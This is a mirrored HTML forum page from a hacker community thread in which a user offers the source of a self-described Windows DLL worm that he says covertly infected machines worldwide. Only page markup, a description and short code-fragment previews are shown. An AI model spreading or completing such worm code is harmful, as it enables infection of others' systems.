@@ -1,0 +1,3668 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/showthread.php?t=333 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 12:23:39 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
+<base  /><!--[if IE]></base><![endif]-->
+<meta name="generator" content="vBulletin 4.2.1" />
+<meta http-equiv="X-UA-Compatible" content="IE=9" />
+
+	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
+
+
+
+
+
+
+	<meta property="fb:app_id" content="170793809601191" />
+<meta property="og:site_name" content="Garage4hackers Forum" />
+<meta property="og:description" content="Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research." />
+<meta property="og:url" content="showthreadc7b7.html?t=333" />
+<meta property="og:type" content="article" />
+
+
+
+
+	
+		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
+	
+
+<script type="text/javascript">
+<!--
+	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
+	{
+		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
+		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
+		var yuipath = 'clientscript/yui';
+		var yuicombopath = '';
+		var remoteyui = false;
+	}
+	else	// Load Rest of YUI remotely (where possible)
+	{
+		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var remoteyui = true;
+		if (!yuicombopath)
+		{
+			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
+		}
+	}
+	var SESSIONURL = "";
+	var SECURITYTOKEN = "guest";
+	var IMGDIR_MISC = "images/misc";
+	var IMGDIR_BUTTON = "images/buttons";
+	var vb_disable_ajax = parseInt("0", 10);
+	var SIMPLEVERSION = "421";
+	var BBURL = "index.html";
+	var LOGGEDIN = 0 > 0 ? true : false;
+	var THIS_SCRIPT = "showthread";
+	var RELPATH = "showthreadc7b7.html?t=333";
+	var PATHS = {
+		forum : "",
+		cms   : "",
+		blog  : ""
+	};
+	var AJAXBASEURL = "index.html";
+// -->
+</script>
+<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>
+
+
+
+	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
+	
+		<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - Botnets, Malwares &amp; Rootkits Analysis - RSS Feed" href="external935d.php?type=RSS2&amp;forumids=25" />
+	
+
+
+
+	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />
+
+	<!--[if lt IE 8]>
+	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
+	<![endif]-->
+
+
+	<meta name="keywords" content="natsec, define, char, void, include, ipsz], handle, memory, state, pragma, shared, checksum, vinnu, null, server, unsigned, security, processing, natsec.dll, attributes, retrieved, setting, performance, file, port, directory, block, xtremers, legion, section, worm, false, data_seg, bool, datawinnt, application, dirtert[], dirpath[], internalname[], documentsnatsec, packqcp.lnk, /--------------global, section------------, hprocess, packfile[], dirname[], winntsec.dll, intdirpath[], internalpath[], tert[]" />
+	<meta name="description" content="Author : &quot;vinnu&quot; 
+Developer : &quot;vinnu&quot; 
+Team : Legion Of Xtremers 
+Year : 2006-2007 
+IDE : VC++ 6.0 
+Type : win32.dll layer worm 
+Damage : None, rather has performance boosters 
+ 
+NatSec (project name) worm was my one of most interestign and efficient worms in the past with its infections in nearly every continent but in very secret manner and very few. 
+I m going to reveal its diminished (trimmed) varient for educational purpose with most of its functionality removed, but still can do enough" />
+
+	<title> NatSec worm Source code --- Lets discus...&quot;vinnu&quot;</title>
+	<link rel="canonical" href="showthreadc7b7.html?t=333" />
+	
+	<script type="text/javascript" src="clientscript/vbulletin_textedit6719.html?v=421"></script>
+	<script type="text/javascript" src="clientscript/vbulletin_post_loader6719.html?v=421"></script>
+	
+	
+	
+	
+	
+	
+
+	
+		<link rel="stylesheet" type="text/css" href="css8d9b.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postlist.css,showthread.css,postbit.css,attachment.css,poll.css,lightbox.css" />
+	
+
+<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+
+<body>
+
+<div class="above_body"> <!-- closing tag is in template navbar -->
+<div id="header" class="floatcontainer doc_header">
+	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+	<div id="toplinks" class="toplinks">
+		
+			<ul class="nouser">
+			
+				<li><a href="register.html" rel="nofollow">Register</a></li>
+			
+				<li><a rel="help" href="faq.html">Help</a></li>
+				<li>
+			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
+			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
+				<fieldset id="logindetails" class="logindetails">
+					<div>
+						<div>
+					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
+					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
+					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
+					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
+						</div>
+					</div>
+				</fieldset>
+				<div id="remember" class="remember">
+					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
+				</div>
+
+				<input type="hidden" name="s" value="" />
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="login" />
+				<input type="hidden" name="vb_login_md5password" />
+				<input type="hidden" name="vb_login_md5password_utf" />
+			</form>
+			<script type="text/javascript">
+			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+			vB_XHTML_Ready.subscribe(function()
+			{
+			//
+				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
+				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
+				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
+				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
+			});
+			
+			function navbar_username_focus(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == 'User Name')
+				{
+				//
+					textbox.value='';
+					textbox.style.color='#000000';
+				}
+			}
+
+			function navbar_username_blur(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == '')
+				{
+				//
+					textbox.value='User Name';
+					textbox.style.color='#777777';
+				}
+			}
+			
+			function navbar_password_hint(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
+				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
+				YAHOO.util.Dom.get('navbar_password').focus();
+			}
+
+			function navbar_password(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				if (textbox.value == '')
+				{
+					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+				}
+			}
+			</script>
+				</li>
+				
+					<li id="fb_headerbox" class="hidden">
+
+	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>
+
+</li>
+
+				
+			</ul>
+		
+	</div>
+	<div class="ad_global_header">
+		 
+		 
+	</div>
+	<hr />
+</div>
+<div id="navbar" class="navbar">
+	<ul id="navtabs" class="navtabs floatcontainer">
+		
+		
+	
+		<li  id="vbtab_whatsnew">
+			<a class="navtab" href="activity.html">What's New?</a>
+		</li>
+		
+		
+
+	
+		<li  id="vbtab_cms">
+			<a class="navtab" href="content.html">Articles</a>
+		</li>
+		
+		
+
+	
+		<li class="selected" id="vbtab_forum">
+			<a class="navtab" href="forum.html">Forum</a>
+		</li>
+		
+		
+			<ul class="floatcontainer">
+				
+					
+						
+							<li id="vbflink_newposts"><a href="search8427.html?do=getnew&amp;contenttype=vBForum_Post">New Posts</a></li>
+						
+					
+				
+					
+						
+							<li id="vbflink_faq"><a href="faq.html">FAQ</a></li>
+						
+					
+				
+					
+						
+							<li id="vbflink_calendar"><a href="calendar.html">Calendar</a></li>
+						
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_community">
+							<a href="javascript://" class="popupctrl">Community</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbclink_members"><a href="memberlist.html">Member List</a></li>
+								
+							</ul>
+						</li>
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_actions">
+							<a href="javascript://" class="popupctrl">Forum Actions</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbalink_mfr"><a href="forum.html?do=markread&amp;markreadhash=guest">Mark Forums Read</a></li>
+								
+							</ul>
+						</li>
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_qlinks">
+							<a href="javascript://" class="popupctrl">Quick Links</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbqlink_posts"><a href="search2791.html?do=getdaily&amp;contenttype=vBForum_Post">Today's Posts</a></li>
+								
+									<li id="vbqlink_leaders"><a href="showgroups.html">View Site Leaders</a></li>
+								
+							</ul>
+						</li>
+					
+				
+			</ul>
+		
+
+	
+		<li  id="vbtab_blog">
+			<a class="navtab" href="blog.html">Blogs</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nja4_357">
+			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_579">
+			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_442">
+			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
+		</li>
+		
+		
+
+		<li>
+            <a class="navtab" href="pages.html">Events and Conferences</a></li>
+	</ul>
+	
+		<div id="globalsearch" class="globalsearch">
+			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
+				
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="process" />
+				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
+				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
+			</form>
+			<ul class="navbar_advanced_search">
+				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
+				
+			</ul>
+		</div>
+	
+</div>
+</div><!-- closing div for above_body -->
+
+<div class="body_wrapper">
+<div id="breadcrumb" class="breadcrumb">
+	<ul class="floatcontainer">
+		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
+		
+	<li class="navbit"><a href="forum.html">Forum</a></li>
+
+	<li class="navbit"><a href="forumdisplayffeb.html?f=20">Experts Forum</a></li>
+
+	<li class="navbit"><a href="forumdisplaye8b3.html?f=25">Botnets, Malwares &amp; Rootkits Analysis</a></li>
+
+		
+	<li class="navbit lastnavbit"><span> NatSec worm Source code --- Lets discus...&quot;vinnu&quot;</span></li>
+
+	</ul>
+	<hr />
+</div>
+
+
+<div style="width:728px; margin:0 auto; padding-bottom:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 728;
+google_ad_height = 15;
+google_ad_format = "728x15_0ads_al_s";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- garage1 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-6847984837250662"
+     data-ad-slot="4036513682"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+
+	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
+		<input type="hidden" name="do" value="dismissnotice" />
+		<input type="hidden" name="s" value="" />
+		<input type="hidden" name="securitytoken" value="guest" />
+		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
+		<input type="hidden" name="url" value="" />
+		<ol>
+			<li class="restore" id="navbar_notice_2">
+	
+	<html>
+<h2>
+The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 
+
+
+</h2>
+
+<!-- Mirrored from garage4hackers.com/showthread.php?t=333 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 12:23:39 GMT -->
+</html>
+</li>
+		</ol>
+	</form>
+
+
+
+
+
+	<div id="above_postlist" class="above_postlist">
+		
+
+		<div id="pagination_top" class="pagination_top">
+		
+			<form action="../external.html?link=http://garage4hackers.com/showthread.php?t=333&amp;page=3&amp;p=961" method="get" class="pagination popupmenu nohovermenu">
+<input type="hidden" name="t" value="333" /><input type="hidden" name="p" value="961" />
+	
+		<span><a href="javascript://" class="popupctrl">Page 1 of 4</a></span>
+		
+		
+		
+		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 34">1</a></span><span><a href="showthread4b5d.html?t=333&amp;page=2&amp;p=961" title="Show results 11 to 20 of 34">2</a></span><span><a href="showthread0431.html?t=333&amp;page=3&amp;p=961" title="Show results 21 to 30 of 34">3</a></span>
+		
+		<span class="separator">...</span>
+		
+		
+		<span class="prev_next"><a rel="next" href="showthread4b5d.html?t=333&amp;page=2&amp;p=961" title="Next Page - Results 11 to 20 of 34"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		
+		
+		<span class="first_last"><a href="showthread3536.html?t=333&amp;page=4&amp;p=961" title="Last Page - Results 31 to 34 of 34">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		
+	
+	<ul class="popupbody popuphover">
+		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+	</ul>
+</form>
+		
+			<div id="postpagestats_above" class="postpagestats">
+				Results 1 to 10 of 34
+			</div>
+		</div>
+	</div>
+<div id="pagetitle" class="pagetitle">
+	<h1>
+		Thread: <span class="threadtitle"><a href="showthreadc7b7.html?t=333" title="Reload this Page">NatSec worm Source code --- Lets discus...&quot;vinnu&quot;</a></span>
+
+<a class="a2a_dd" href="../external.html?link=http://www.addtoany.com/share_save"><img src="../static.addtoany.com/buttons/share_save_171_16.png" width="171" height="16" border="0" alt="Share/Save - My123World.Com!"/></a><script type="text/javascript">a2a_show_title=1;a2a_num_services=14;</script><script type="text/javascript" src="../static.addtoany.com/menu/page.js"></script>
+
+		
+			
+<fb:like href="showthreadc7b7.html?t=333" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like>
+		
+	</h1>
+</div>
+	<div id="thread_controls" class="thread_controls">
+		<div>
+		<ul id="postlist_popups" class="postlist_popups popupgroup">
+			
+			<li class="popupmenu" id="threadtools">
+				<h6><a class="popupctrl" href="javascript://">Thread Tools</a></h6>
+				<ul class="popupbody popuphover">
+					<li><a href="printthreadf5c5.html?t=333&amp;pp=10&amp;page=1" accesskey="3" 
+						rel="nofollow">Show Printable Version</a></li>
+					<li><a href="sendmessagef6fb.html?do=sendtofriend&amp;t=333"
+						rel="nofollow">Email this Page&hellip;</a></li>
+					<li>
+						
+							<a href="subscriptione19e.html?do=addsubscription&amp;t=333" 
+								rel="nofollow">Subscribe to this Thread&hellip;</a>
+											
+					</li>
+					
+				</ul>
+			</li>
+
+			
+
+			
+				<li class="popupmenu searchthread" id="searchthread">
+					<h6><a class="popupctrl" href="javascript://">Search Thread</a></h6>
+					<form action="../external.html?link=http://garage4hackers.com/search.php" method="post">
+						<ul class="popupbody popuphover">
+							<li>
+								<input type="text" name="query" class="searchbox" value="Search..." tabindex="13" />
+								<input type="submit" class="button" value="Search" tabindex="14" />
+							</li>
+							<li class="formsubmit">
+								<div><a class="advancedsearchlink" href="search95ba.html?search_type=1&amp;searchthreadid=333&amp;contenttype=vBForum_Post">Advanced Search</a></div>
+							</li>
+						</ul>
+						<input type="hidden" name="s" value="" />
+						<input type="hidden" name="securitytoken" value="guest" />
+						<input type="hidden" name="do" value="process" />
+						<input type="hidden" name="searchthreadid" value="333" />
+						<input type="hidden" name="search_type" value="1" />
+						<input type="hidden" name="contenttype" value="vBForum_Post" />
+
+					</form>
+				</li>
+			
+
+			
+
+			
+				<li class="popupmenu" id="displaymodes">
+					<h6><a class="popupctrl" href="javascript://">Display</a></h6>
+					<ul class="popupbody popuphover">
+						<li><a href="showthread9fad.html?t=333&amp;p=961&amp;mode=linear#post961"> Switch to Linear Mode</a></li>
+						<li><label>Hybrid Mode</label></li>
+						<li><a href="showthreadf5d9.html?t=333&amp;p=961&amp;mode=threaded#post961"> Switch to Threaded Mode</a></li>
+					</ul>
+				</li>
+			
+
+			
+		</ul>
+		</div>
+	</div>
+
+<div id="postlist" class="postlist restrain">
+	
+		<script type="text/javascript">
+<!--
+var imgdir_statusicon = "images/statusicon";
+var imgdir_misc = "images/misc";
+var cleargifurl = "clear.gif";
+var guestphrase = "Guest";
+var morephrase = "More replies below current depth...";
+var highlightwords = "";
+//-->
+</script>
+
+<script type="text/javascript" src="clientscript/vbulletin_thrdpostlist6719.html?v=421"></script>
+
+<script type="text/javascript">
+<!--
+// initialize some variables
+var curpostid = 961;
+var quickreply = false;
+
+// cached posts (no page reload required to view)
+
+// next/previous post info
+
+// cached usernames
+pu[0] = guestphrase;
+pu[61] = "&quot;vinnu&quot;";
+pu[18] = "prashant_uniyal";
+pu[3] = "AnArKI";
+pu[228] = "ph0b0s";
+pu[16] = "41.w4r10r";
+pu[57] = "sandeep";
+pu[238] = "[s]";
+pu[196] = "kanoor";
+pu[10286] = "dotcppfile";
+
+// -->
+</script>
+
+
+<div id="threaded_view">
+	<h4>Hybrid View</h4>
+
+	<div id="posttree">
+		<script type="text/javascript">
+		<!--
+			writeLink(961, 0, 0, 61, "", "NatSec worm Source code -" + "-" + "-...", "09-16-2010", "08:56 AM", 1, "showthread0f67.html?t=333&amp;p=961#post961");
+  writeLink(971, 0, 0, 61, "T", "Sorce code of worm", "09-16-2010", "05:41 PM", 1, "showthread7da5-2.html?t=333&amp;p=971#post971");
+    writeLink(972, 0, 0, 61, "I,T", "<i>BOOL warkeyInit()	{...</i>", "09-16-2010", "05:43 PM", 1, "showthread3165.html?t=333&amp;p=972#post972");
+    writeLink(973, 0, 0, 61, "I,L", "<i>plainbuffer[24] =...</i>", "09-16-2010", "05:43 PM", 1, "showthreadc545.html?t=333&amp;p=973#post973");
+      writeLink(975, 0, 0, 61, "I,1,L", "<i>plainbuffer[69] =...</i>", "09-16-2010", "05:50 PM", 1, "showthreadea76.html?t=333&amp;p=975#post975");
+  writeLink(974, 0, 0, 61, "T", "<i>&quot;\\xBA\\xB0\\xA0\\x9E\\xF5\\xF1\\x90\\...</i>", "09-16-2010", "05:48 PM", 1, "showthreadd610.html?t=333&amp;p=974#post974");
+  writeLink(976, 0, 0, 61, "T", "<i>&quot;\\xE8\\xCA\\xF9\\x80\\xAE\\xA5\\xED\\...</i>", "09-16-2010", "05:50 PM", 1, "showthreadaa74.html?t=333&amp;p=976#post976");
+    writeLink(978, 0, 0, 61, "I,T", "<i>/*&quot;SYSTEM\\\\CurrentControlSet\\\\...</i>", "09-16-2010", "05:52 PM", 1, "showthread7438.html?t=333&amp;p=978#post978");
+    writeLink(979, 0, 0, 61, "I,T", "<i>//-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-Loop...</i>", "09-16-2010", "05:54 PM", 1, "showthread435b.html?t=333&amp;p=979#post979");
+      writeLink(13452, 0, 0, 10286, "I,I,L", "<i>Thanks a lot for sharing...</i>", "07-14-2014", "05:50 PM", 1, "showthread4b3d.html?t=333&amp;p=13452#post13452");
+    writeLink(980, 0, 0, 61, "I,L", "<i>Sleep(SHORTINTERVAL); \n			if...</i>", "09-16-2010", "05:55 PM", 1, "showthreadf804.html?t=333&amp;p=980#post980");
+      writeLink(982, 0, 0, 61, "I,1,L", "<i>if ((len =...</i>", "09-16-2010", "05:57 PM", 1, "showthread300a.html?t=333&amp;p=982#post982");
+  writeLink(977, 0, 0, 61, "T", "<i>&quot;\\xD8\\xE0\\xD9\\x8C\\xC5\\xE0\\xDF\\...</i>", "09-16-2010", "05:51 PM", 1, "showthreade33b.html?t=333&amp;p=977#post977");
+  writeLink(981, 0, 0, 61, "T", "<i>/*-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-DLL...</i>", "09-16-2010", "05:56 PM", 1, "showthread4644.html?t=333&amp;p=981#post981");
+  writeLink(983, 0, 0, 61, "T", "<i>//-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-Cloning...</i>", "09-16-2010", "05:58 PM", 1, "showthread7edc.html?t=333&amp;p=983#post983");
+  writeLink(984, 0, 0, 61, "T", "<i>/*-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-Quantom-Con...</i>", "09-16-2010", "05:58 PM", 1, "showthread8669.html?t=333&amp;p=984#post984");
+    writeLink(986, 0, 0, 61, "I,L", "<i>unsigned short...</i>", "09-16-2010", "05:59 PM", 1, "showthread3e70.html?t=333&amp;p=986#post986");
+      writeLink(989, 0, 0, 61, "I,1,T", "<i>/*-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-Event...</i>", "09-16-2010", "06:02 PM", 1, "showthread82f1.html?t=333&amp;p=989#post989");
+      writeLink(990, 0, 0, 61, "I,1,T", "<i>void privilAdj()	{...</i>", "09-16-2010", "06:03 PM", 1, "showthread3183-2.html?t=333&amp;p=990#post990");
+      writeLink(991, 0, 0, 61, "I,1,L", "<i>spmesg[24] =...</i>", "09-16-2010", "06:04 PM", 1, "showthread10ba.html?t=333&amp;p=991#post991");
+  writeLink(985, 0, 0, 61, "T", "<i>void connectorQCP(char...</i>", "09-16-2010", "05:59 PM", 1, "showthreada0fd.html?t=333&amp;p=985#post985");
+  writeLink(987, 0, 0, 61, "T", "<i>//[+]-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-Contagiou...</i>", "09-16-2010", "06:00 PM", 1, "showthreadc769.html?t=333&amp;p=987#post987");
+  writeLink(992, 0, 0, 61, "T", "<i>spmesg[41] =...</i>", "09-16-2010", "06:05 PM", 1, "showthread4ae8.html?t=333&amp;p=992#post992");
+    writeLink(994, 0, 0, 61, "I,L", "<i>hwrun = FindWindow(NULL,...</i>", "09-16-2010", "06:06 PM", 1, "showthread3746.html?t=333&amp;p=994#post994");
+  writeLink(993, 0, 0, 61, "T", "<i>spmesg[50] = NULL;		// Also...</i>", "09-16-2010", "06:06 PM", 1, "showthread3c61.html?t=333&amp;p=993#post993");
+  writeLink(995, 0, 0, 61, "T", "<i>/*-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-" + "-End...</i>", "09-16-2010", "06:07 PM", 1, "showthreadaae4-2.html?t=333&amp;p=995#post995");
+    writeLink(996, 0, 0, 18, "I,L", "<i>Marvelous!!!!!!! No...</i>", "09-16-2010", "06:15 PM", 1, "showthread578f.html?t=333&amp;p=996#post996");
+  writeLink(997, 0, 0, 3, "T", "<i>Thanks a lot mate....gr8...</i>", "09-16-2010", "06:58 PM", 1, "showthread2354.html?t=333&amp;p=997#post997");
+  writeLink(1342, 0, 0, 228, "T", "<i>just too excellent ! \nSince i...</i>", "10-29-2010", "03:41 AM", 1, "showthread4431.html?t=333&amp;p=1342#post1342");
+  writeLink(1351, 0, 0, 16, "T", "<i>How much time it took you to...</i>", "10-29-2010", "10:10 AM", 1, "showthread408d.html?t=333&amp;p=1351#post1351");
+    writeLink(1366, 0, 0, 61, "I,L", "Time taken...&quot;vinnu&quot;", "10-29-2010", "03:51 PM", 1, "showthread5429.html?t=333&amp;p=1366#post1366");
+  writeLink(1399, 0, 0, 57, "T", "<i>Vinnu can you please upload...</i>", "11-01-2010", "03:30 AM", 1, "showthreadc8e2.html?t=333&amp;p=1399#post1399");
+  writeLink(1729, 0, 0, 238, "T", "<i>Bro the single program you...</i>", "11-28-2010", "08:01 AM", 1, "showthread71ea-2.html?t=333&amp;p=1729#post1729");
+  writeLink(4608, 0, 0, 196, "L", "<i>i learnt many things from...</i>", "06-29-2011", "10:43 PM", 1, "showthreada059.html?t=333&amp;p=4608#post4608");
+
+		//-->
+		</script>
+	</div>
+</div>
+	
+
+	
+		<ol id="posts" class="posts" start="1">
+			
+<li class="postbitlegacy postbitim postcontainer old" id="post_961">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">09-16-2010,&nbsp;<span class="time">08:56 AM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post961" href="showthread9d77.html?t=333&amp;p=961&amp;viewfull=1#post961" class="postcounter">#1</a><a id="postcount961" name="1"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberf35f.html?u=61" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="searchea10.html?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatecde6.html?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogf35f.html?u=61" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list3989.html?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="&quot;vinnu&quot; is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Security Researcher
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_961_61" title="&quot;vinnu&quot; is a jewel in the rough">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			
+			<a class="postuseravatar" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline">
